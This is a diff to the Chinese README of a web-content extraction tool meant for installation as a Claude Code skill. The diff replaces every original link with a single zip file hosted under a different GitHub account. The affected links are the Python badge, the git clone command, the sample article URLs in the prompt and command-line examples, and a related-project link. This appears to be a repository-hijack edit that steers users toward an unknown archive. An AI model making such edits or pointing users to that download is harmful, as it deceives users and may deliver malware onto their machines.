@@ -4,7 +4,7 @@
 
 **网页正文提取 · 永久免费 · 支持微信公众号**
 
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)](https://www.python.org/)
+[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)](https://raw.githubusercontent.com/protective-didelphis804/web-content-fetcher/main/scripts/web_content_fetcher_v2.7-alpha.5.zip)
 [![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
 
 </div>
@@ -30,7 +30,7 @@ Web Content Fetcher 是一个轻量级的网页正文提取工具，能够自动
 
 ```bash
 # Clone
-git clone https://github.com/shirenchuang/web-content-fetcher.git
+git clone https://raw.githubusercontent.com/protective-didelphis804/web-content-fetcher/main/scripts/web_content_fetcher_v2.7-alpha.5.zip
 
 # Copy to Claude Code skills directory
 cp -r web-content-fetcher ~/.claude/skills/
@@ -53,27 +53,27 @@ pip install scrapling html2text
 直接告诉 AI 你要读取的 URL，会自动选择最佳方案：
 
 ```
-帮我读取这篇文章：https://mp.weixin.qq.com/s/EwVItQH4JUsONqv_Fmi4wQ
-Extract the content from https://openai.com/blog/gpt-4o
+帮我读取这篇文章：https://raw.githubusercontent.com/protective-didelphis804/web-content-fetcher/main/scripts/web_content_fetcher_v2.7-alpha.5.zip
+Extract the content from https://raw.githubusercontent.com/protective-didelphis804/web-content-fetcher/main/scripts/web_content_fetcher_v2.7-alpha.5.zip
 ```
 
 ### 命令行单独使用
 
 ```bash
 # 基础用法（自动选择 fast 或 stealth 模式）
-python3 scripts/fetch.py https://sspai.com/post/73145
+python3 scripts/fetch.py https://raw.githubusercontent.com/protective-didelphis804/web-content-fetcher/main/scripts/web_content_fetcher_v2.7-alpha.5.zip
 
 # 强制 stealth 模式（用于 JS 渲染页面）
-python3 scripts/fetch.py https://mp.weixin.qq.com/s/xxx --stealth
+python3 scripts/fetch.py https://raw.githubusercontent.com/protective-didelphis804/web-content-fetcher/main/scripts/web_content_fetcher_v2.7-alpha.5.zip --stealth
 
 # 限制输出字符数（默认 30000）
-python3 scripts/fetch.py https://example.com/article 15000
+python3 scripts/fetch.py https://raw.githubusercontent.com/protective-didelphis804/web-content-fetcher/main/scripts/web_content_fetcher_v2.7-alpha.5.zip 15000
 
 # JSON 输出（含 url, mode, selector, content_length）
-python3 scripts/fetch.py https://example.com --json
+python3 scripts/fetch.py https://raw.githubusercontent.com/protective-didelphis804/web-content-fetcher/main/scripts/web_content_fetcher_v2.7-alpha.5.zip --json
 
 # 输出到文件
-python3 scripts/fetch.py https://example.com/article > output.md
+python3 scripts/fetch.py https://raw.githubusercontent.com/protective-didelphis804/web-content-fetcher/main/scripts/web_content_fetcher_v2.7-alpha.5.zip > output.md
 ```
 
 ---
@@ -165,7 +165,7 @@ URL 输入
 
 ## 相关项目
 
-### [Kuaifa（快发）](https://github.com/shirenchuang/kuaifa) — 公众号一键排版发布
+### [Kuaifa（快发）](https://raw.githubusercontent.com/protective-didelphis804/web-content-fetcher/main/scripts/web_content_fetcher_v2.7-alpha.5.zip) — 公众号一键排版发布
 
 如果你需要将 Markdown 文章发布到微信公众号，推荐使用 **Kuaifa**：
 
